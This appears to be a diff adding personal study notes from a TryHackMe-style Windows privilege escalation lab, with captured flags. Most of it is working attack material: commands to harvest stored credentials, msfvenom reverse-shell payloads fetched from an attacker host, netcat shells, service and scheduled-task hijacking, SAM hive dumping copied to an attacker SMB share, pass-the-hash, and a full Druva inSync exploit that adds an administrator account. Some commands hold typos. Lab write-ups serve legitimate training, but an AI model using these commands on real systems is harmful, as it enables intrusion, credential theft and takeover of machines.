@@ -1,0 +1,245 @@
+Windows Users
+1. Admnistrators: change any system configs parameter and access any file
+2. Standard Users: access computer to only perform limited tasks, can not make permanent or essential changes to the system
+
+------------------------------------------------------------------------------------------------------------------------------
+
+HARVERST PASSWORDS
+
+Unattended Windows Installations
+-Windows Deployment Services: allows for a single OS image to be deployed to several hosts through the network => unattended installations
+-use Admin account to perform initial setup
+-stored in: 
+-C:\Unattend.xml
+-C:\Windows\Panther\Unattend.xml
+-C:\Windows\Panther\Unattend\Unattend.xml
+-C:\Windows\system32\sysprep.inf
+-C:\Windows\system32\sysprep\sysprep.xml
+
+Powershell History
+cmd: type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+powershell: type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+*julia.jones /pass:ZuperCkretPa5z
+
+Saved Windows Credentials
+-option to save credentials on the system
+cmdkey /list
+-can't see pw 
+runas /savecred /user:admin cmd.exe
+
+*C:\Users\mike.katz\Desktop>type flag.txt
+*THM{WHAT_IS_MY_PASSWORD}
+
+IIS configuration
+-Internet Information Services: default web server on Windows installations
+-stored in a file: web.config at:
+1. C:\inetpub\wwwroot\web.config
+2. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+type C:\Windows\Microsoft.NET\Framework64\v4.0.40319\Config\web.config | findstr connectionString
+
+*ID=db_admin;Password=098n0x35skjD3
+
+Retrieve credentials from software
+-PuTTy is an SSH client commonly found on Windows systems. 
+-store proxy configs including clear text auth creds
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+-Simon Tatham is creator of PuTTY - name is part of path
+*ProxyUsername: thom.smith
+*ProxyPassword: CoolPass2021
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Other Quick Wins
+
+Scheduled Tasks
+-modify scheduled tasks using binary
+schtasks
+-look of Task to Run and Run as User
+-check file permissions on the executable 
+icacls c:\tasks\schtask.bat
+-modify the .bat file and insert payload
+echo c:\tools\nc64.exe -e cmd.exe [Attacker IP] [PORT] > C:\tasks\schtask.bat
+-go to attacker machine
+nc -lvp 4444
+*THM{TASK_COMPLETED}
+
+
+AlwaysIntallElevated
+-windows installer files .msi
+-run with privilege level of the user
+-could allow the generation of a malicious MSI file that would run with admin privileges
+-requires two reg values to be set
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+-generate a malicious .msi file using msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.51.11 LPORT=LOCAL_PORT -f msi -o malicious.msi
+-run installer
+C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Windows Services
+-managed by Service Control Manager (SCM)
+-each service has an associated executable run by SCM when service is started
+-service exe can communicate with SCM
+-shows user account the service runs under
+sc qc
+-services have a Disccretionary Access Control List (DACL)
+-stored at HKLM\SYSTEM\CurrentControlSet\Services\
+
+Insecure Permissions on Service Executable
+sc qc WindowsScheduler
+-list binary path
+icacls [binary path]
+-if everyone group has modify permissions on the service exe - it can be overwritten with payload
+-generate payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER IP] LPORT=[PORT] -f exe-service -o rev-svc.exe
+-serve file
+phython3 -m http.server
+-get file on victim computer
+wget http://ATTACKER_IP:PORT/rev-svc.exe -O rev-svc.exe
+-execute service
+cd [binary path]
+move WService.exe WService.exe.bkp
+move rev-svc.exe WService.exe
+icacls WService.exe /grant Everyone:F
+-netcat listener on Attacker machine
+nc -lvp [PORT]
+-stop and restart windows scheduler
+sc stop windowsscheduler
+sc start windowsscheduler
+*THM{AT_YOUR_SERVICE}
+
+-----------------------------------------------------------------------------------------------------------------------
+
+Unquoted Service Paths
+-path of assciated exe is not properly quoted to account of spaces on the command
+-using powershell need to use sc.exe to control services 
+-SCM searches a list for the correct exe to run
+-an attacker could create a payload exe that is searched
+sc qc "disk sorter enterprise"
+-check if permision to create files and folders in C:\
+icacls c:\MyPrograms
+-if BUILTIN\\Users has AD and WD privileges
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACK_IP] LPORT=[PORT] -f exe-service -o rev-svc2.exe
+-serve file
+phython3 -m http.server
+-get file
+wget http://[Attacker_IP]:[port]/rev-svc2.exe -O rev-svc2.exe
+-move file
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+-get permission to restart disk sorter
+cd C:\
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+-start listener
+nc -lvp [PORT]
+-stop and restart disk sorter
+sc stop "disk sorter enterprise"
+sc start "disk sorter enterprise"
+*THM{QUOTES_EVERYWHERE}
+
+Insecure Service Permissions
+-check if service DACL allows the attacker to modify the configuration of a service
+accesschk64.exe -qlc thmservice
+-if BUILTIN\\Users has SERVICE_ALL_ACCESS permission, the user can reconfigure the service
+-generate a reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp HOST=[ATTACKER_IP] PORT=[PORT] -f exe-service -o rev-svc3.exe
+-start netcat listener
+nc -lvp [PORT]
+-start server
+python3 -m http.server
+-get payload on victim machine
+wget http://[ATTACKER_IP]:[port]/rev-svc3.exe -O rev-svc3.exe
+-grant permission
+C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+-configure service
+sc config THMService binPath="C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem
+-restart server
+sc stop THMService
+sc start THMService
+*THM{INSECURE_SVC_CONFIG}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Windows Privileges
+xfreerdp /u:THMBackup /p:CopyMaster555 /v:[IP]
+-privileges are rights that an account has to perform specific system-related tasks
+-check assigned privileges
+whoami /priv
+
+SeBackup / SeRestore
+-allow user to read and write any file in the system ingnoring DACL
+-granted to "backup operators" group 
+-open Command Prompt as Admin
+whoami /priv
+cd C:\
+-backup SAM and System hashes
+reg save hklm\system C:\Users\THMBackup\system.hive
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+-copy file to attacker machine using SMB smbserver.py
+mkdir share
+-use impacket smbserver.py
+python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+-copy to share
+C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+secretsdump.py -sam sam.hive -system system.hive LOCAL
+psexec.py -hashes [hash] [user]@[MACHINE_IP]
+
+SeImporsonate / SeAssignPrimaryToken
+-FTP: user uses personal token to access FTP server and FTP server uses its own token to retrieve files
+-Local Service and network service accounts have similar privileges
+-PORT  5985 used for WinRM service - powershell console used remotely
+-start netcat listner
+nc -lvp 4442
+-victim machine 
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+
+---------------------------------------------------------------------------------------------
+
+Unpatched software
+-wmic to list installed software and dump information
+wmic product get name,version,vendor
+-may not return all installed programs
+-search on exploit-db, packet storm or google to find exploits
+
+Druva inSync 6.6.4
+-vuln: runs RPC server on port 6064 with System privileges
+-run the code in powershell
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+
+-open command prompt as admin
+-use new created account
+pwnd
+SimplePass123
+
+-find flag C:\Users\Administrator\Desktop
+type flag.txt
+*THM{EZ_DLL_PROXY_4ME}
+
+
+
+
+
+
+
